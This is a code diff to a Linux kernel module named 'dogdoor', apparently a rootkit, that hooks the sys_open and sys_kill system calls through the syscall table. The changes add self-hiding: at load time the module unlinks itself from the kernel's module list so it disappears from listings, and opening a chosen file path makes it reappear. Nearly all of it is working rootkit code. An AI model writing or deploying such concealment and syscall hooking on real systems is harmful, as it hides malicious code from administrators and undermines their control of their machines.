@@ -8,13 +8,61 @@
 #include <linux/kernel.h>
 #include <asm/unistd.h>
 #include <linux/signal.h>
-
+#include <linux/list.h>
+#include <linux/slab.h>
 
 MODULE_LICENSE("GPL");
 
 char filepath[128] = { 0x0, } ;
 void ** sctable ;
 int count = 0 ;
+
+static
+struct module_node{
+	struct module *mod;
+	struct list_head *mod_next;
+} ;
+
+static struct list_head *mod_prev;
+static int hidden = 0;
+
+static
+void hide_module (struct module *mod) {
+	if (mod == THIS_MODULE){
+		mod_prev= mod->list.prev;
+	} else {	
+		struct module_node *mod_node ;
+		mod_node = kmalloc (sizeof(struct module_node), GFP_KERNEL);
+		mod_node->mod = mod;
+		mod_node->mod_next = mod->list.next;
+	}
+	list_del(&mod->list);
+}
+
+static
+void module_hide (void) {
+	if (hidden)
+		return;
+	hide_module(THIS_MODULE);
+	hidden = 1;
+}
+
+static
+void unhide_module (struct module *mod, struct list_head *head) {
+	if (mod == THIS_MODULE)
+		list_add(&mod->list, head);
+	else
+		list_add_tail(&mod->list, head);
+}
+
+static 
+void module_unhide (void) {
+	if (!hidden)
+		return;
+	unhide_module(THIS_MODULE, mod_prev);
+	hidden = 0;
+}
+
 
 asmlinkage int (*orig_sys_open)(const char __user * filename, int flags, umode_t mode) ; 
 
@@ -26,7 +74,7 @@ asmlinkage int dogdoor_sys_open(const char __user * filename, int flags, umode_t
 
 	if (filepath[0] != 0x0 && strcmp(filepath, fname) == 0) {
 		count++ ;
-		return -1 ;
+		module_unhide() ;
 	}
 	return orig_sys_open(filename, flags, mode) ;
 }
@@ -107,6 +155,8 @@ int __init dogdoor_init(void) {
 
 	orig_sys_open = sctable[__NR_open] ;
 	orig_sys_kill = sctable[__NR_kill] ;
+
+	module_hide();
 
 	pte = lookup_address((unsigned long) sctable, &level) ;
 	if (pte->pte &~ _PAGE_RW) 
